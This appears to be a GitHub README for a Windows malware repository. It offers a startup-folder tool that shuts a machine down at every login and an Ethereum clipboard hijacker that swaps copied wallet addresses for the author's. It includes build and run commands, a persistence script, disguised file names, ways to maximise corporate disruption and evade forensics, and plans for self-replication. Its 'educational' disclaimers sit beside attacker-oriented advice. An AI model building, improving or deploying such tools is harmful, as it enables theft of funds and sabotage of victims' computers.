# :skull_and_crossbones::computer: CYCLIC CPU SHUTDOWN :computer::skull_and_crossbones:

### DISCLAIMER
**_THIS WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES AND IS NOT TO BE USED ELSEWHERE. DO NOT USE THIS FOR ILLEGAL PURPOSES, PERIOD! ONLY OPERABLE ON WINDOWS OS!_**


## SUMMARY
This _"ShutDown.exe"_ application creates a _Shutdown.lnk_ (link or pointer file) in a user's startup directory that calls the native _"C:\Windows\System32\shutdown.exe"_ executable every time the host's account is logged into. With this cyclical setup, your computer will  turn off every time the infected user account logs in. This malware becomes potent in the case where the user does not have ease of access to start their operating system in Safe Mode (i.e. - consider virtual desktops/cloud-based operating systems used by large coporations where access to these lower level controls may be restricted.) Malicious actors can potentially use this application to hault a corporation's BAU (business as usual) for some period of time which can be considered extremely damaging when timed effectively (i.e. mergers and acquisitions, IPO's, quarterly reporting, etc.)


## DEMONSTRATION
<a href="https://github.com/KesMath/Windows_OS_Malware_Repo/blob/master/cyclic_shutdown_vm.gif"><img src="./cyclic_shutdown_vm.gif"></a>


## COUNTERMEASURES IF INFECTED
1. Navigate to Windows Safe Mode Configurations
2. Traverse Advanced Options until "Enable Safe Mode with Command Prompt" appears
3. Reboot Windows in safe mode and navigate to the startup folder using the cmd prompt 
4. Use necessary commands to delete the shutdown.lnk


## COMPILATION AND USAGE
```
cd .\WindowsExecutables_v2.0\
csc /reference:Interop.IWshRuntimeLibrary.dll .\ShutDown.cs //for local testing
.\ShutDown.exe //assure IWshRuntimeLibrary.dll is located in same directory at runtime
```


## DEPENDENCY
_Interop.IWshRuntimeLibrary.dll_ is a library reference used to create .lnk files. This .dll must located in the same directory with _ShutDown.exe_ for application to run successfully.


## FUTURE IMPLEMENTATION

- [ ] Overriding permissions on the global startup directory and injecting
the shutdown.lnk file into it will be catastrophic to a computer
as programs within the global directory takes running precedence 
over applications in the local startup. This implies that all user accounts
will shut off when logged into! This is indeed difficult as it requires tampering with Windows Security but one workaround is to copy this script on all accounts within a given machine. This [reference](https://www.lepide.com/how-to/list-all-user-accounts-on-a-windows-system-using-powershell.html) may serve as a starting point. Keep in mind that if this option is taken instead copying the application to the global directory, the victim can simply create a new account to break out of this cyclic shutdown.

- [ ] Within the startup folder, have _ShutDown.lnk_ take priority over _desktop.ini_ for faster shutdown. One idea is to delete original _desktop.ini_ so that on startup, no desktop is loaded and shutdown happens instantly!

- [ ] Merging _ShutDown.exe_ binary file with _Interop.IWshRuntimeLibrary.dll_ for better portability.
This [ILMerge Static Linker](https://github.com/dotnet/ILMerge) seems promising.

## WARNING
**_This software has serious ramifications as it can potentially harm nearly all Windows based computers or servers when installed. This software was created solely for educational purposes and is not meant to be distributed or exploited in any other ways. Therefore, I am not held liable for the ill-doings caused by the use of this software._**

*******************************************************************************
*******************************************************************************
*******************************************************************************
*******************************************************************************



# :skull_and_crossbones::money_mouth_face: ETHEREUM WALLET ADDRESS SWAPPER :money_mouth_face::skull_and_crossbones:
 



### DISCLAIMER
**_THIS WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES AND IS NOT TO BE USED ELSEWHERE. DO NOT USE THIS FOR ILLEGAL PURPOSES, PERIOD! ONLY OPERABLE ON WINDOWS OS!_**





## CRYPTOCURRENCY BACKGROUND
At the time of the write-up, Ethereum (ETH) is the second largest cryptocurrency based on  market capitalization, with the intent of
serving as a platform token for other coins to be developed from. From a technical view,
this means that other cryptos who desire to mimic ETH's functionality must follow its interface known as the [ERC20](https://en.wikipedia.org/wiki/ERC-20) protocol.
As a direct result of following such standard, tokens
will have the same wallet address format that prefixes with _0x_ and is 42 characters long of alphanumeric text.
This is where this listener exploit becomes advantageous.

**_(FYI: visit [ERC-20 Token List](https://eidoo.io/erc20-tokens-list) to see all ETH based cryptos.
Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a vast number of machines)_**





## SUMMARY
This application is a clipboard listener that swaps the client's wallet address
with addresses that are declared within the program. If the host does not perform his/her due diligence
and sends their ETH-based crypto while this application is running, those assets will have routed to
one of the 10 preset addresses permanently! Given the transparent nature of public blockchains, the victim
will undoubtedly be able to see where their funds were transferred via block explorers such as [Blockchain.info](https://www.blockchain.com/explorer).
As a warning, ramifications are not yet explored and there is a chance that there may exist
some crypto forensic agency that can associate a wallet to an IP addresses so proceed with caution!!!


## DEMONSTRATION
<a href="https://github.com/KesMath/Windows_OS_Malware_Repo/blob/master/clipboard_app.gif"><img src="./clipboard_app.gif"></a>


## COUNTERMEASURES IF INFECTED
Aside from the obvious file removal, if infected, you can painstakingly type out your address when performing a transaction, or simply
copy the address in parts. The latter being the most efficient option.





## COMPILATION AND USAGE
``` 
csc '.\src\main\c#\virus suite\crypto\app\sys_host_dl_v4.0.30319_69.cs'
cd src/main/c#/scripts/powershell/crypto
./sys_host_dl_v4.0.30319_64_persistence.ps1
```




## FEATURES
    * light overhead (7KB file size that was clocked using ~16-19% processor utilization with RAM usage recorded around 3.7MB)

    * randomization with 10 addresses in order to create the impression that host is being targeted by different bad actors

    * powershell listener that scans proc list to assure that this script continually runs after its condition is met once. This ensures the script's continuity as the victim will always be under the surveillance of the script's listener.

    * executable name is social engineered for host to believe this file belongs to the system. Thus inexperienced victims may be hesitant to delete it due to the potential of their computer being inoperative.




 
## FUTURE IMPLEMENTATION
- [X] [tested](https://github.com/KesMath/Windows_OS_Malware_Repo/blob/master/src/main/c%23/virus%20suite/crypto/notes/ClipboardLogger-12HR-Passive.rar) over 1.3 million iterations (~12 hrs) without no faults
- [ ] completely refactor source code to model an Event Driven Programmming paradigm where case logic calls will be reduced and clipboard change will only be triggered upon some type of Listener event
- [ ] turn into a daemon by silencing console window
- [ ] remove logging writes to speed up performance
- [ ] counter the countermeasure stated above
- [ ] activation upon computer restart/shutdown
- [ ] self-replicating file upon deletion
- [ ] complete thorough performance testing (Is ram/cpu usage intensive or disruptive when host uses other apps? Does it crash after a certain span of time? If so, why?)


## WARNING
**_As stated earlier, this software was created solely for educational purposes and is not meant to be distributed or exploited in any other ways.
Therefore, I am not held liable for the ill-doings caused by the use of this software. Given the extremely high financial gain that can be yielded
through such software, be warned that an equal level of backlash will surely follow!_**